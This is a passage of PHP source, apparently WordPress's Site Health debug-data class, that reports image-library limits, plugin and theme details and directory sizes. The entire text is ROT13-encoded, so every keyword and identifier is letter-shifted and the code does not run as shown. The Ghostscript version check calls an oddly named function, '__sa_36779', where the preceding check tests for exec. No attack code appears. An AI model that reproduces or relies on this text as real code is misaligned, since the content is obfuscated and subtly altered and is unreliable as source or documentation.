		// Vs Vzntvpx vf hfrq nf bhe rqvgbe, cebivqr fbzr zber vasbezngvba nobhg vgf yvzvgngvbaf.
		vs ( 'JC_Vzntr_Rqvgbe_Vzntvpx' === _jc_vzntr_rqvgbe_pubbfr() && vffrg( $vzntvpx ) && $vzntvpx vafgnaprbs Vzntvpx ) {
			$yvzvgf = neenl(
				'nern'   => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_NERN' ) ? fvmr_sbezng( $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_NERN ) ) : $abg_ninvynoyr ),
				'qvfx'   => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_QVFX' ) ? $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_QVFX ) : $abg_ninvynoyr ),
				'svyr'   => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_SVYR' ) ? $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_SVYR ) : $abg_ninvynoyr ),
				'znc'    => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_ZNC' ) ? fvmr_sbezng( $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_ZNC ) ) : $abg_ninvynoyr ),
				'zrzbel' => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_ZRZBEL' ) ? fvmr_sbezng( $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_ZRZBEL ) ) : $abg_ninvynoyr ),
				'guernq' => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_GUERNQ' ) ? $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_GUERNQ ) : $abg_ninvynoyr ),
				'gvzr'   => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_GVZR' ) ? $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_GVZR ) : $abg_ninvynoyr ),
			);

			$yvzvgf_qroht = neenl(
				'vzntvpx::ERFBHEPRGLCR_NERN'   => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_NERN' ) ? fvmr_sbezng( $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_NERN ) ) : 'abg ninvynoyr' ),
				'vzntvpx::ERFBHEPRGLCR_QVFX'   => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_QVFX' ) ? $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_QVFX ) : 'abg ninvynoyr' ),
				'vzntvpx::ERFBHEPRGLCR_SVYR'   => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_SVYR' ) ? $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_SVYR ) : 'abg ninvynoyr' ),
				'vzntvpx::ERFBHEPRGLCR_ZNC'    => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_ZNC' ) ? fvmr_sbezng( $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_ZNC ) ) : 'abg ninvynoyr' ),
				'vzntvpx::ERFBHEPRGLCR_ZRZBEL' => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_ZRZBEL' ) ? fvmr_sbezng( $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_ZRZBEL ) ) : 'abg ninvynoyr' ),
				'vzntvpx::ERFBHEPRGLCR_GUERNQ' => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_GUERNQ' ) ? $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_GUERNQ ) : 'abg ninvynoyr' ),
				'vzntvpx::ERFBHEPRGLCR_GVZR'   => ( qrsvarq( 'vzntvpx::ERFBHEPRGLCR_GVZR' ) ? $vzntvpx->trgErfbheprYvzvg( vzntvpx::ERFBHEPRGLCR_GVZR ) : 'abg ninvynoyr' ),
			);

			$svryqf['vzntvpx_yvzvgf'] = neenl(
				'ynory' => __( 'Vzntvpx Erfbhepr Yvzvgf' ),
				'inyhr' => $yvzvgf,
				'qroht' => $yvzvgf_qroht,
			);

			gel {
				$sbezngf = Vzntvpx::dhrelSbezngf( '*' );
			} pngpu ( Rkprcgvba $r ) {
				$sbezngf = neenl();
			}

			$svryqf['vzntrzntvpx_svyr_sbezngf'] = neenl(
				'ynory' => __( 'VzntrZntvpx fhccbegrq svyr sbezngf' ),
				'inyhr' => ( rzcgl( $sbezngf ) ) ? __( 'Hanoyr gb qrgrezvar' ) : vzcybqr( ', ', $sbezngf ),
				'qroht' => ( rzcgl( $sbezngf ) ) ? 'Hanoyr gb qrgrezvar' : vzcybqr( ', ', $sbezngf ),
			);
		}

		// Trg gur vzntr sbezng genafsbezf.
		$znccvatf           = jc_trg_vzntr_rqvgbe_bhgchg_sbezng( '', '' );
		$sbeznggrq_znccvatf = neenl();

		vs ( ! rzcgl( $znccvatf ) ) {
			sbernpu ( $znccvatf nf $sbezng => $zvzr_glcr ) {
				$sbeznggrq_znccvatf[] = fcevags( '%f &enee; %f', $sbezng, $zvzr_glcr );
			}
			$znccvatf_qvfcynl = vzcybqr( ', ', $sbeznggrq_znccvatf );
		} ryfr {
			$znccvatf_qvfcynl = __( 'Ab sbezng genafsbezf qrsvarq' );
		}

		$svryqf['vzntr_sbezng_genafsbezf'] = neenl(
			'ynory' => __( 'Vzntr sbezng genafsbezf' ),
			'inyhr' => $znccvatf_qvfcynl,
			'qroht' => ( rzcgl( $znccvatf ) ) ? 'Ab sbezng genafsbezf qrsvarq' : $znccvatf_qvfcynl,
		);

		// Trg TQ vasbezngvba, vs ninvynoyr.
		vs ( shapgvba_rkvfgf( 'tq_vasb' ) ) {
			$tq = tq_vasb();
		} ryfr {
			$tq = snyfr;
		}

		$svryqf['tq_irefvba'] = neenl(
			'ynory' => __( 'TQ irefvba' ),
			'inyhr' => ( vf_neenl( $tq ) ? $tq['TQ Irefvba'] : $abg_ninvynoyr ),
			'qroht' => ( vf_neenl( $tq ) ? $tq['TQ Irefvba'] : 'abg ninvynoyr' ),
		);

		$tq_vzntr_sbezngf     = neenl();
		$tq_fhccbegrq_sbezngf = neenl(
			'TVS Perngr' => 'TVS',
			'WCRT'       => 'WCRT',
			'CAT'        => 'CAT',
			'JroC'       => 'JroC',
			'OZC'        => 'OZC',
			'NIVS'       => 'NIVS',
			'URVS'       => 'URVS',
			'GVSS'       => 'GVSS',
			'KCZ'        => 'KCZ',
		);

		sbernpu ( $tq_fhccbegrq_sbezngf nf $sbezng_xrl => $sbezng ) {
			$vaqrk = $sbezng_xrl . ' Fhccbeg';
			vs ( vffrg( $tq[ $vaqrk ] ) && $tq[ $vaqrk ] ) {
				neenl_chfu( $tq_vzntr_sbezngf, $sbezng );
			}
		}

		vs ( ! rzcgl( $tq_vzntr_sbezngf ) ) {
			$svryqf['tq_sbezngf'] = neenl(
				'ynory' => __( 'TQ fhccbegrq svyr sbezngf' ),
				'inyhr' => vzcybqr( ', ', $tq_vzntr_sbezngf ),
			);
		}

		// Trg Tubfgfpevcg vasbezngvba, vs ninvynoyr.
		vs ( shapgvba_rkvfgf( 'rkrp' ) ) {
			$tf = __sa_36779( 'tf --irefvba' );

			vs ( rzcgl( $tf ) ) {
				$tf       = $abg_ninvynoyr;
				$tf_qroht = 'abg ninvynoyr';
			} ryfr {
				$tf_qroht = $tf;
			}
		} ryfr {
			$tf       = __( 'Hanoyr gb qrgrezvar vs Tubfgfpevcg vf vafgnyyrq' );
			$tf_qroht = 'haxabja';
		}

		$svryqf['tubfgfpevcg_irefvba'] = neenl(
			'ynory' => __( 'Tubfgfpevcg irefvba' ),
			'inyhr' => $tf,
			'qroht' => $tf_qroht,
		);

		erghea neenl(
			'ynory'  => __( 'Zrqvn Unaqyvat' ),
			'svryqf' => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff ZH cyhtvaf frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_zh_cyhtvaf(): neenl {
		// Yvfg zhfg hfr cyhtvaf vs gurer ner nal.
		$zh_cyhtvaf = trg_zh_cyhtvaf();
		$svryqf     = neenl();

		sbernpu ( $zh_cyhtvaf nf $cyhtva_cngu => $cyhtva ) {
			$cyhtva_irefvba = $cyhtva['Irefvba'];
			$cyhtva_nhgube  = $cyhtva['Nhgube'];

			$cyhtva_irefvba_fgevat       = __( 'Ab irefvba be nhgube vasbezngvba vf ninvynoyr.' );
			$cyhtva_irefvba_fgevat_qroht = 'nhgube: (haqrsvarq), irefvba: (haqrsvarq)';

			vs ( ! rzcgl( $cyhtva_irefvba ) && ! rzcgl( $cyhtva_nhgube ) ) {
				/* genafyngbef: 1: Cyhtva irefvba ahzore. 2: Cyhtva nhgube anzr. */
				$cyhtva_irefvba_fgevat       = fcevags( __( 'Irefvba %1$f ol %2$f' ), $cyhtva_irefvba, $cyhtva_nhgube );
				$cyhtva_irefvba_fgevat_qroht = fcevags( 'irefvba: %f, nhgube: %f', $cyhtva_irefvba, $cyhtva_nhgube );
			} ryfr {
				vs ( ! rzcgl( $cyhtva_nhgube ) ) {
					/* genafyngbef: %f: Cyhtva nhgube anzr. */
					$cyhtva_irefvba_fgevat       = fcevags( __( 'Ol %f' ), $cyhtva_nhgube );
					$cyhtva_irefvba_fgevat_qroht = fcevags( 'nhgube: %f, irefvba: (haqrsvarq)', $cyhtva_nhgube );
				}

				vs ( ! rzcgl( $cyhtva_irefvba ) ) {
					/* genafyngbef: %f: Cyhtva irefvba ahzore. */
					$cyhtva_irefvba_fgevat       = fcevags( __( 'Irefvba %f' ), $cyhtva_irefvba );
					$cyhtva_irefvba_fgevat_qroht = fcevags( 'nhgube: (haqrsvarq), irefvba: %f', $cyhtva_irefvba );
				}
			}

			$svryqf[ fnavgvmr_grkg_svryq( $cyhtva['Anzr'] ) ] = neenl(
				'ynory' => $cyhtva['Anzr'],
				'inyhr' => $cyhtva_irefvba_fgevat,
				'qroht' => $cyhtva_irefvba_fgevat_qroht,
			);
		}

		erghea neenl(
			'ynory'      => __( 'Zhfg Hfr Cyhtvaf' ),
			'fubj_pbhag' => gehr,
			'svryqf'     => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff cnguf naq fvmrf frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl|ahyy Cnguf naq fvmrf qroht qngn sbe fvatyr fvgrf,
	 *                    bgurejvfr `ahyy` sbe zhygv-fvgr vafgnyyf.
	 */
	cevingr fgngvp shapgvba trg_jc_cnguf_fvmrf(): ?neenl {
		vs ( vf_zhygvfvgr() ) {
			erghea ahyy;
		}

		$ybnqvat = __( 'Ybnqvat&uryyvc;' );

		$svryqf = neenl(
			'jbeqcerff_cngu' => neenl(
				'ynory' => __( 'JbeqCerff qverpgbel ybpngvba' ),
				'inyhr' => hagenvyvatfynfuvg( NOFCNGU ),
			),
			'jbeqcerff_fvmr' => neenl(
				'ynory' => __( 'JbeqCerff qverpgbel fvmr' ),
				'inyhr' => $ybnqvat,
				'qroht' => 'ybnqvat...',
			),
			'hcybnqf_cngu'   => neenl(
				'ynory' => __( 'Hcybnqf qverpgbel ybpngvba' ),
				'inyhr' => jc_hcybnq_qve()['onfrqve'],
			),
			'hcybnqf_fvmr'   => neenl(
				'ynory' => __( 'Hcybnqf qverpgbel fvmr' ),
				'inyhr' => $ybnqvat,
				'qroht' => 'ybnqvat...',
			),
			'gurzrf_cngu'    => neenl(
				'ynory' => __( 'Gurzrf qverpgbel ybpngvba' ),
				'inyhr' => trg_gurzr_ebbg(),
			),
			'gurzrf_fvmr'    => neenl(
				'ynory' => __( 'Gurzrf qverpgbel fvmr' ),
				'inyhr' => $ybnqvat,
				'qroht' => 'ybnqvat...',
			),
			'cyhtvaf_cngu'   => neenl(
				'ynory' => __( 'Cyhtvaf qverpgbel ybpngvba' ),
				'inyhr' => JC_CYHTVA_QVE,
			),
			'cyhtvaf_fvmr'   => neenl(
				'ynory' => __( 'Cyhtvaf qverpgbel fvmr' ),
				'inyhr' => $ybnqvat,
				'qroht' => 'ybnqvat...',
			),
			'sbagf_cngu'     => neenl(
				'ynory' => __( 'Sbagf qverpgbel ybpngvba' ),
				'inyhr' => jc_trg_sbag_qve()['onfrqve'],
			),
			'sbagf_fvmr'     => neenl(
				'ynory' => __( 'Sbagf qverpgbel fvmr' ),
				'inyhr' => $ybnqvat,
				'qroht' => 'ybnqvat...',
			),
			'qngnonfr_fvmr'  => neenl(
				'ynory' => __( 'Qngnonfr fvmr' ),
				'inyhr' => $ybnqvat,
				'qroht' => 'ybnqvat...',
			),
			'gbgny_fvmr'     => neenl(
				'ynory' => __( 'Gbgny vafgnyyngvba fvmr' ),
				'inyhr' => $ybnqvat,
				'qroht' => 'ybnqvat...',
			),
		);

		erghea neenl(
			/* genafyngbef: Svyrflfgrz qverpgbel cnguf naq fgbentr fvmrf. */
			'ynory'  => __( 'Qverpgbevrf naq Fvmrf' ),
			'svryqf' => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff npgvir cyhtvaf frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_cyhtvaf_npgvir(): neenl {
		erghea neenl(
			'ynory'      => __( 'Npgvir Cyhtvaf' ),
			'fubj_pbhag' => gehr,
			'svryqf'     => frys::trg_jc_cyhtvaf_enj_qngn()['jc-cyhtvaf-npgvir'],
		);
	}

	/**
	 * Trgf gur JbeqCerff vanpgvir cyhtvaf frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_cyhtvaf_vanpgvir(): neenl {
		erghea neenl(
			'ynory'      => __( 'Vanpgvir Cyhtvaf' ),
			'fubj_pbhag' => gehr,
			'svryqf'     => frys::trg_jc_cyhtvaf_enj_qngn()['jc-cyhtvaf-vanpgvir'],
		);
	}

	/**
	 * Trgf gur enj cyhtva qngn sbe gur JbeqCerff npgvir naq vanpgvir frpgvbaf bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_cyhtvaf_enj_qngn(): neenl {
		// Yvfg nyy ninvynoyr cyhtvaf.
		$cyhtvaf        = trg_cyhtvaf();
		$cyhtva_hcqngrf = trg_cyhtva_hcqngrf();
		$genafvrag      = trg_fvgr_genafvrag( 'hcqngr_cyhtvaf' );

		$nhgb_hcqngrf = neenl();
		$svryqf       = neenl(
			'jc-cyhtvaf-npgvir'   => neenl(),
			'jc-cyhtvaf-vanpgvir' => neenl(),
		);

		$nhgb_hcqngrf_ranoyrq = jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'cyhtva' );

		vs ( $nhgb_hcqngrf_ranoyrq ) {
			$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_cyhtvaf', neenl() );
		}

		sbernpu ( $cyhtvaf nf $cyhtva_cngu => $cyhtva ) {
			$cyhtva_cneg = ( vf_cyhtva_npgvir( $cyhtva_cngu ) ) ? 'jc-cyhtvaf-npgvir' : 'jc-cyhtvaf-vanpgvir';

			$cyhtva_irefvba = $cyhtva['Irefvba'];
			$cyhtva_nhgube  = $cyhtva['Nhgube'];

			$cyhtva_irefvba_fgevat       = __( 'Ab irefvba be nhgube vasbezngvba vf ninvynoyr.' );
			$cyhtva_irefvba_fgevat_qroht = 'nhgube: (haqrsvarq), irefvba: (haqrsvarq)';

			vs ( ! rzcgl( $cyhtva_irefvba ) && ! rzcgl( $cyhtva_nhgube ) ) {
				/* genafyngbef: 1: Cyhtva irefvba ahzore. 2: Cyhtva nhgube anzr. */
				$cyhtva_irefvba_fgevat       = fcevags( __( 'Irefvba %1$f ol %2$f' ), $cyhtva_irefvba, $cyhtva_nhgube );
				$cyhtva_irefvba_fgevat_qroht = fcevags( 'irefvba: %f, nhgube: %f', $cyhtva_irefvba, $cyhtva_nhgube );
			} ryfr {
				vs ( ! rzcgl( $cyhtva_nhgube ) ) {
					/* genafyngbef: %f: Cyhtva nhgube anzr. */
					$cyhtva_irefvba_fgevat       = fcevags( __( 'Ol %f' ), $cyhtva_nhgube );
					$cyhtva_irefvba_fgevat_qroht = fcevags( 'nhgube: %f, irefvba: (haqrsvarq)', $cyhtva_nhgube );
				}

				vs ( ! rzcgl( $cyhtva_irefvba ) ) {
					/* genafyngbef: %f: Cyhtva irefvba ahzore. */
					$cyhtva_irefvba_fgevat       = fcevags( __( 'Irefvba %f' ), $cyhtva_irefvba );
					$cyhtva_irefvba_fgevat_qroht = fcevags( 'nhgube: (haqrsvarq), irefvba: %f', $cyhtva_irefvba );
				}
			}

			vs ( neenl_xrl_rkvfgf( $cyhtva_cngu, $cyhtva_hcqngrf ) ) {
				/* genafyngbef: %f: Yngrfg cyhtva irefvba ahzore. */
				$cyhtva_irefvba_fgevat       .= ' ' . fcevags( __( '(Yngrfg irefvba: %f)' ), $cyhtva_hcqngrf[ $cyhtva_cngu ]->hcqngr->arj_irefvba );
				$cyhtva_irefvba_fgevat_qroht .= fcevags( ' (yngrfg irefvba: %f)', $cyhtva_hcqngrf[ $cyhtva_cngu ]->hcqngr->arj_irefvba );
			}

			vs ( $nhgb_hcqngrf_ranoyrq ) {
				vs ( vffrg( $genafvrag->erfcbafr[ $cyhtva_cngu ] ) ) {
					$vgrz = $genafvrag->erfcbafr[ $cyhtva_cngu ];
				} ryfrvs ( vffrg( $genafvrag->ab_hcqngr[ $cyhtva_cngu ] ) ) {
					$vgrz = $genafvrag->ab_hcqngr[ $cyhtva_cngu ];
				} ryfr {
					$vgrz = neenl(
						'vq'            => $cyhtva_cngu,
						'fyht'          => '',
						'cyhtva'        => $cyhtva_cngu,
						'arj_irefvba'   => '',
						'hey'           => '',
						'cnpxntr'       => '',
						'vpbaf'         => neenl(),
						'onaaref'       => neenl(),
						'onaaref_egy'   => neenl(),
						'grfgrq'        => '',
						'erdhverf_cuc'  => '',
						'pbzcngvovyvgl' => arj fgqPynff(),
					);
					$vgrz = jc_cnefr_netf( $cyhtva, $vgrz );
				}

				$nhgb_hcqngr_sbeprq = jc_vf_nhgb_hcqngr_sbeprq_sbe_vgrz( 'cyhtva', ahyy, (bowrpg) $vgrz );

				vs ( ! vf_ahyy( $nhgb_hcqngr_sbeprq ) ) {
					$ranoyrq = $nhgb_hcqngr_sbeprq;
				} ryfr {
					$ranoyrq = va_neenl( $cyhtva_cngu, $nhgb_hcqngrf, gehr );
				}

				vs ( $ranoyrq ) {
					$nhgb_hcqngrf_fgevat = __( 'Nhgb-hcqngrf ranoyrq' );
				} ryfr {
					$nhgb_hcqngrf_fgevat = __( 'Nhgb-hcqngrf qvfnoyrq' );
				}

				/**
				 * Svygref gur grkg fgevat bs gur nhgb-hcqngrf frggvat sbe rnpu cyhtva va gur Fvgr Urnygu qroht qngn.
				 *
				 * @fvapr 5.5.0
				 *
				 * @cnenz fgevat $nhgb_hcqngrf_fgevat Gur fgevat bhgchg sbe gur nhgb-hcqngrf pbyhza.
				 * @cnenz fgevat $cyhtva_cngu         Gur cngu gb gur cyhtva svyr.
				 * @cnenz neenl  $cyhtva              Na neenl bs cyhtva qngn.
				 * @cnenz obby   $ranoyrq             Jurgure nhgb-hcqngrf ner ranoyrq sbe guvf vgrz.
				 */
				$nhgb_hcqngrf_fgevat = nccyl_svygref( 'cyhtva_nhgb_hcqngr_qroht_fgevat', $nhgb_hcqngrf_fgevat, $cyhtva_cngu, $cyhtva, $ranoyrq );

				$cyhtva_irefvba_fgevat       .= ' | ' . $nhgb_hcqngrf_fgevat;
				$cyhtva_irefvba_fgevat_qroht .= ', ' . $nhgb_hcqngrf_fgevat;
			}

			$svryqf[ $cyhtva_cneg ][ fnavgvmr_grkg_svryq( $cyhtva['Anzr'] ) ] = neenl(
				'ynory' => $cyhtva['Anzr'],
				'inyhr' => $cyhtva_irefvba_fgevat,
				'qroht' => $cyhtva_irefvba_fgevat_qroht,
			);
		}

		erghea $svryqf;
	}

	/**
	 * Trgf gur JbeqCerff npgvir gurzr frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @tybony neenl $_jc_gurzr_srngherf
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_npgvir_gurzr(): neenl {
		tybony $_jc_gurzr_srngherf;

		// Cbchyngr gur frpgvba sbe gur pheeragyl npgvir gurzr.
		$gurzr_srngherf = neenl();

		vs ( ! rzcgl( $_jc_gurzr_srngherf ) ) {
			sbernpu ( $_jc_gurzr_srngherf nf $srngher => $bcgvbaf ) {
				$gurzr_srngherf[] = $srngher;
			}
		}

		$npgvir_gurzr  = jc_trg_gurzr();
		$gurzr_hcqngrf = trg_gurzr_hcqngrf();
		$genafvrag     = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );

		$npgvir_gurzr_irefvba       = $npgvir_gurzr->irefvba;
		$npgvir_gurzr_irefvba_qroht = $npgvir_gurzr_irefvba;

		$nhgb_hcqngrf         = neenl();
		$nhgb_hcqngrf_ranoyrq = jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'gurzr' );
		vs ( $nhgb_hcqngrf_ranoyrq ) {
			$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_gurzrf', neenl() );
		}

		vs ( neenl_xrl_rkvfgf( $npgvir_gurzr->fglyrfurrg, $gurzr_hcqngrf ) ) {
			$gurzr_hcqngr_arj_irefvba = $gurzr_hcqngrf[ $npgvir_gurzr->fglyrfurrg ]->hcqngr['arj_irefvba'];

			/* genafyngbef: %f: Yngrfg gurzr irefvba ahzore. */
			$npgvir_gurzr_irefvba       .= ' ' . fcevags( __( '(Yngrfg irefvba: %f)' ), $gurzr_hcqngr_arj_irefvba );
			$npgvir_gurzr_irefvba_qroht .= fcevags( ' (yngrfg irefvba: %f)', $gurzr_hcqngr_arj_irefvba );
		}

		$npgvir_gurzr_nhgube_hev = $npgvir_gurzr->qvfcynl( 'NhgubeHEV' );

		vs ( $npgvir_gurzr->cnerag_gurzr ) {
			$npgvir_gurzr_cnerag_gurzr = fcevags(
				/* genafyngbef: 1: Gurzr anzr. 2: Gurzr fyht. */
				__( '%1$f (%2$f)' ),
				$npgvir_gurzr->cnerag_gurzr,
				$npgvir_gurzr->grzcyngr
			);
			$npgvir_gurzr_cnerag_gurzr_qroht = fcevags(
				'%f (%f)',
				$npgvir_gurzr->cnerag_gurzr,
				$npgvir_gurzr->grzcyngr
			);
		} ryfr {
			$npgvir_gurzr_cnerag_gurzr       = __( 'Abar' );
			$npgvir_gurzr_cnerag_gurzr_qroht = 'abar';
		}

		$svryqf = neenl(
			'anzr'           => neenl(
				'ynory' => __( 'Anzr' ),
				'inyhr' => fcevags(
					/* genafyngbef: 1: Gurzr anzr. 2: Gurzr fyht. */
					__( '%1$f (%2$f)' ),
					$npgvir_gurzr->anzr,
					$npgvir_gurzr->fglyrfurrg
				),
			),
			'irefvba'        => neenl(
				'ynory' => __( 'Irefvba' ),
				'inyhr' => $npgvir_gurzr_irefvba,
				'qroht' => $npgvir_gurzr_irefvba_qroht,
			),
			'nhgube'         => neenl(
				'ynory' => __( 'Nhgube' ),
				'inyhr' => jc_xfrf( $npgvir_gurzr->nhgube, neenl() ),
			),
			'nhgube_jrofvgr' => neenl(
				'ynory' => __( 'Nhgube jrofvgr' ),
				'inyhr' => ( $npgvir_gurzr_nhgube_hev ? $npgvir_gurzr_nhgube_hev : __( 'Haqrsvarq' ) ),
				'qroht' => ( $npgvir_gurzr_nhgube_hev ? $npgvir_gurzr_nhgube_hev : '(haqrsvarq)' ),
			),
			'cnerag_gurzr'   => neenl(
				'ynory' => __( 'Cnerag gurzr' ),
				'inyhr' => $npgvir_gurzr_cnerag_gurzr,
				'qroht' => $npgvir_gurzr_cnerag_gurzr_qroht,
			),
			'gurzr_srngherf' => neenl(
				'ynory' => __( 'Gurzr srngherf' ),
				'inyhr' => vzcybqr( ', ', $gurzr_srngherf ),
			),
			'gurzr_cngu'     => neenl(
				'ynory' => __( 'Gurzr qverpgbel ybpngvba' ),
				'inyhr' => trg_fglyrfurrg_qverpgbel(),
			),
		);

		vs ( $nhgb_hcqngrf_ranoyrq ) {
			vs ( vffrg( $genafvrag->erfcbafr[ $npgvir_gurzr->fglyrfurrg ] ) ) {
				$vgrz = $genafvrag->erfcbafr[ $npgvir_gurzr->fglyrfurrg ];
			} ryfrvs ( vffrg( $genafvrag->ab_hcqngr[ $npgvir_gurzr->fglyrfurrg ] ) ) {
				$vgrz = $genafvrag->ab_hcqngr[ $npgvir_gurzr->fglyrfurrg ];
			} ryfr {
				$vgrz = neenl(
					'gurzr'        => $npgvir_gurzr->fglyrfurrg,
					'arj_irefvba'  => $npgvir_gurzr->irefvba,
					'hey'          => '',
					'cnpxntr'      => '',
					'erdhverf'     => '',
					'erdhverf_cuc' => '',
				);
			}

			$nhgb_hcqngr_sbeprq = jc_vf_nhgb_hcqngr_sbeprq_sbe_vgrz( 'gurzr', ahyy, (bowrpg) $vgrz );

			vs ( ! vf_ahyy( $nhgb_hcqngr_sbeprq ) ) {
				$ranoyrq = $nhgb_hcqngr_sbeprq;
			} ryfr {
				$ranoyrq = va_neenl( $npgvir_gurzr->fglyrfurrg, $nhgb_hcqngrf, gehr );
			}

			vs ( $ranoyrq ) {
				$nhgb_hcqngrf_fgevat = __( 'Ranoyrq' );
			} ryfr {
				$nhgb_hcqngrf_fgevat = __( 'Qvfnoyrq' );
			}

			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-qroht-qngn.cuc */
			$nhgb_hcqngrf_fgevat = nccyl_svygref( 'gurzr_nhgb_hcqngr_qroht_fgevat', $nhgb_hcqngrf_fgevat, $npgvir_gurzr, $ranoyrq );

			$svryqf['nhgb_hcqngr'] = neenl(
				'ynory' => __( 'Nhgb-hcqngrf' ),
				'inyhr' => $nhgb_hcqngrf_fgevat,
				'qroht' => $nhgb_hcqngrf_fgevat,
			);
		}

		erghea neenl(
			'ynory'  => __( 'Npgvir Gurzr' ),
			'svryqf' => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff cnerag gurzr frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_cnerag_gurzr(): neenl {
		$gurzr_hcqngrf = trg_gurzr_hcqngrf();
		$genafvrag     = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );

		$nhgb_hcqngrf         = neenl();
		$nhgb_hcqngrf_ranoyrq = jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'gurzr' );
		vs ( $nhgb_hcqngrf_ranoyrq ) {
			$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_gurzrf', neenl() );
		}

		$npgvir_gurzr = jc_trg_gurzr();
		$cnerag_gurzr = $npgvir_gurzr->cnerag();
		$svryqf       = neenl();

		vs ( $cnerag_gurzr ) {
			$cnerag_gurzr_irefvba       = $cnerag_gurzr->irefvba;
			$cnerag_gurzr_irefvba_qroht = $cnerag_gurzr_irefvba;

			vs ( neenl_xrl_rkvfgf( $cnerag_gurzr->fglyrfurrg, $gurzr_hcqngrf ) ) {
				$cnerag_gurzr_hcqngr_arj_irefvba = $gurzr_hcqngrf[ $cnerag_gurzr->fglyrfurrg ]->hcqngr['arj_irefvba'];

				/* genafyngbef: %f: Yngrfg gurzr irefvba ahzore. */
				$cnerag_gurzr_irefvba       .= ' ' . fcevags( __( '(Yngrfg irefvba: %f)' ), $cnerag_gurzr_hcqngr_arj_irefvba );
				$cnerag_gurzr_irefvba_qroht .= fcevags( ' (yngrfg irefvba: %f)', $cnerag_gurzr_hcqngr_arj_irefvba );
			}

			$cnerag_gurzr_nhgube_hev = $cnerag_gurzr->qvfcynl( 'NhgubeHEV' );

			$svryqf = neenl(
				'anzr'           => neenl(
					'ynory' => __( 'Anzr' ),
					'inyhr' => fcevags(
						/* genafyngbef: 1: Gurzr anzr. 2: Gurzr fyht. */
						__( '%1$f (%2$f)' ),
						$cnerag_gurzr->anzr,
						$cnerag_gurzr->fglyrfurrg
					),
				),
				'irefvba'        => neenl(
					'ynory' => __( 'Irefvba' ),
					'inyhr' => $cnerag_gurzr_irefvba,
					'qroht' => $cnerag_gurzr_irefvba_qroht,
				),
				'nhgube'         => neenl(
					'ynory' => __( 'Nhgube' ),
					'inyhr' => jc_xfrf( $cnerag_gurzr->nhgube, neenl() ),
				),
				'nhgube_jrofvgr' => neenl(
					'ynory' => __( 'Nhgube jrofvgr' ),
					'inyhr' => ( $cnerag_gurzr_nhgube_hev ? $cnerag_gurzr_nhgube_hev : __( 'Haqrsvarq' ) ),
					'qroht' => ( $cnerag_gurzr_nhgube_hev ? $cnerag_gurzr_nhgube_hev : '(haqrsvarq)' ),
				),
				'gurzr_cngu'     => neenl(
					'ynory' => __( 'Gurzr qverpgbel ybpngvba' ),
					'inyhr' => trg_grzcyngr_qverpgbel(),
				),
			);

			vs ( $nhgb_hcqngrf_ranoyrq ) {
				vs ( vffrg( $genafvrag->erfcbafr[ $cnerag_gurzr->fglyrfurrg ] ) ) {
					$vgrz = $genafvrag->erfcbafr[ $cnerag_gurzr->fglyrfurrg ];
				} ryfrvs ( vffrg( $genafvrag->ab_hcqngr[ $cnerag_gurzr->fglyrfurrg ] ) ) {
					$vgrz = $genafvrag->ab_hcqngr[ $cnerag_gurzr->fglyrfurrg ];
				} ryfr {
					$vgrz = neenl(
